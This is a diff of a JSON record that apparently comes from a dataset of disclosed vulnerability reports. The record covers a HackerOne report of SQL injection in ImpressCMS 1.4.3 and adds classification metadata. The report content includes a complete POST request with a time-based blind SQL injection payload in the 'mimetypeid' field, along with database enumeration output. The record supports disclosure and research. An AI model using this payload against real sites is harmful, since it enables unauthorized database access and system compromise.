@@ -1,42 +1,46 @@
 {
-    "reported_to": "ImpressCMS",
-    "reported_by": "cyberinsane ",
-    "title": "SQL Injection in version 1.4.3 and below",
-    "content": "\nSummary:\nSQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.\nImpressCMS branch :\n[1.4]\n## Browsers Verified In:\nGoogle Chrome, Firefox]\nSteps To Reproduce:\nStep1- Login with Admin Credentials\nStep2- Vulnerable Parameter to SQLi: mimetypeid (POST request):\nPOST /ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1 HTTP/1.1\nHost: 192.168.56.117\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------40629177308912268471540748701\nContent-Length: 1011\nOrigin: http://192.168.56.117\nConnection: close\nReferer: http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1\nCookie: tbl_SystemMimetype_sortsel=mimetypeid; tbl_limitsel=15; tbl_SystemMimetype_filtersel=default; ICMSSESSION=7c9f7a65572d2aa40f66a0d468bb20e3\nUpgrade-Insecure-Requests: 1\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"mimetypeid\"\n1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"extension\"\nbin\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"types\"\napplication/octet-stream\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"name\"\nBinary File/Linux Executable\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"icms_page_before_form\"\nhttp://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"op\"\naddmimetype\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"modify_button\"\nSubmit\n-----------------------------40629177308912268471540748701--\nVulnerable Payload:\n1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE) //time-based blind (query SLEEP)\nOutput:\nweb application technology: Apache 2.4.52, PHP 7.4.27\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\navailable databases [6]:\n[*] impresscms\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] phpmyadmin\n[*] test\nSuggestions to mitigate or resolve the issue:\nUse Parameterized Queries\nSupporting Material/References:\nhttps://github.com/sartlabs/0days/blob/main/ImpressCMS1.4.3/Exploit.txt\n[attachment / reference]\nImpact\nSQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.\n\n",
-    "severity": [
-        8.4,
-        null
+  "reported_to": "ImpressCMS",
+  "reported_by": "cyberinsane ",
+  "title": "SQL Injection in version 1.4.3 and below",
+  "content": "\nSummary:\nSQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.\nImpressCMS branch :\n[1.4]\n## Browsers Verified In:\nGoogle Chrome, Firefox]\nSteps To Reproduce:\nStep1- Login with Admin Credentials\nStep2- Vulnerable Parameter to SQLi: mimetypeid (POST request):\nPOST /ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1 HTTP/1.1\nHost: 192.168.56.117\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------40629177308912268471540748701\nContent-Length: 1011\nOrigin: http://192.168.56.117\nConnection: close\nReferer: http://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype&op=mod&mimetypeid=1\nCookie: tbl_SystemMimetype_sortsel=mimetypeid; tbl_limitsel=15; tbl_SystemMimetype_filtersel=default; ICMSSESSION=7c9f7a65572d2aa40f66a0d468bb20e3\nUpgrade-Insecure-Requests: 1\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"mimetypeid\"\n1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"extension\"\nbin\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"types\"\napplication/octet-stream\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"name\"\nBinary File/Linux Executable\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"icms_page_before_form\"\nhttp://192.168.56.117/ImpressCMS/htdocs/modules/system/admin.php?fct=mimetype\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"op\"\naddmimetype\n-----------------------------40629177308912268471540748701\nContent-Disposition: form-data; name=\"modify_button\"\nSubmit\n-----------------------------40629177308912268471540748701--\nVulnerable Payload:\n1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE) //time-based blind (query SLEEP)\nOutput:\nweb application technology: Apache 2.4.52, PHP 7.4.27\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\navailable databases [6]:\n[*] impresscms\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] phpmyadmin\n[*] test\nSuggestions to mitigate or resolve the issue:\nUse Parameterized Queries\nSupporting Material/References:\nhttps://github.com/sartlabs/0days/blob/main/ImpressCMS1.4.3/Exploit.txt\n[attachment / reference]\nImpact\nSQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject into the code in unintended way, this allows an attacker to read and modify the sensitive information from the database used by the application. If misconfigured, an attacker can even upload a malicious web shell to compromise the entire system.\n\n",
+  "severity": [
+    8.4,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1691873040,
+  "report_url": "https://hackerone.com/reports/1506129",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Login with Admin Credentials"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "SQL Injection"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1691873040,
-    "report_url": "https://hackerone.com/reports/1506129",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Login with Admin Credentials"
-        ],
-        [
-            2,
-            "Send a POST request to the vulnerable endpoint with a crafted 'mimetypeid' parameter containing a time-based SQL injection payload"
-        ]
-    ],
-    "vuln_description": "SQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject malicious SQL queries via the 'mimetypeid' parameter in a POST request to the admin.php endpoint. This can lead to unauthorized access to the database, allowing attackers to read and modify sensitive information, and potentially upload malicious web shells to compromise the system.",
-    "reason": "The vulnerability involves a straightforward SQL injection attack via a single parameter in a POST request. The attack does not require complex interactions between multiple components or manipulation of application states. The SQL injection technique used (time-based blind) is well-known and commonly exploited.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The SQL injection vulnerability in ImpressCMS v1.4.3 involves injecting malicious SQL queries through the 'mimetypeid' parameter in a POST request. This is not an authentication or authorization bypass issue but rather a direct injection vulnerability that allows unauthorized database access. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, which does not apply to SQL injection vulnerabilities.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "Send a POST request to the vulnerable endpoint with a crafted 'mimetypeid' parameter containing a time-based SQL injection payload"
+    ]
+  ],
+  "vuln_description": "SQL Injection in ImpressCMS v1.4.3 and earlier allows remote attackers to inject malicious SQL queries via the 'mimetypeid' parameter in a POST request to the admin.php endpoint. This can lead to unauthorized access to the database, allowing attackers to read and modify sensitive information, and potentially upload malicious web shells to compromise the system.",
+  "reason": "The vulnerability involves a straightforward SQL injection attack via a single parameter in a POST request. The attack does not require complex interactions between multiple components or manipulation of application states. The SQL injection technique used (time-based blind) is well-known and commonly exploited.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves manipulating the 'mimetypeid' parameter in a POST request to execute unintended SQL commands. This is not directly related to authentication or authorization bypass but rather an injection flaw. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, which does not apply here since the vulnerability is about SQL injection via parameter manipulation.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The SQL injection vulnerability in ImpressCMS involves a time-based blind payload (`SLEEP(5)`) injected into the `mimetypeid` parameter. The methodology detects injectable parameters during regular navigation and uses simple payloads (e.g., SLEEP for time-based SQLi) that trigger observable delays in the same HTTP response channel. Since the payload is generic, does not require custom filter bypasses, and the delay is detectable in the same request-response cycle, this vulnerability aligns with the methodology's criteria.",
+    "is_simple_injection": true
+  }
 }
